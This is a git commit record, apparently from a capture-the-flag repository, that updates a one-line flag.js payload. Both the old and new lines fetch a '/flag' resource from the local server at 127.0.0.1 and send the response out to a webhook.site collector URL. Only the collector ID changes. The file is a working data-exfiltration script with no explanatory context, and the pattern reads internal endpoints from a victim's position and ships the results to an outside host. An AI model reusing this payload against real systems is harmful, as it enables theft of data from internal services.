b7d526eca33969cf15e7cf41f868dcb79adc3282
3nhj0 <97040301+3nhj0@users.noreply.github.com>
2023-10-01 12:08:32 +0800

    Update flag.js

--- flag.js
+++ flag.js
@@ -1,1 +1,1 @@
-fetch(`http://127.0.0.1/flag`).then((response) => response.json()).then((data) => {fetch(`https://webhook.site/cc325d9e-af5f-4332-b501-c54004927828/?flag=${JSON.stringify(data)}`)})
+fetch(`http://127.0.0.1/flag`).then((response) => response.json()).then((data) => {fetch(`https://webhook.site/9d0a9c0d-fc05-44f8-a322-01f142608045/?flag=${JSON.stringify(data)}`)})
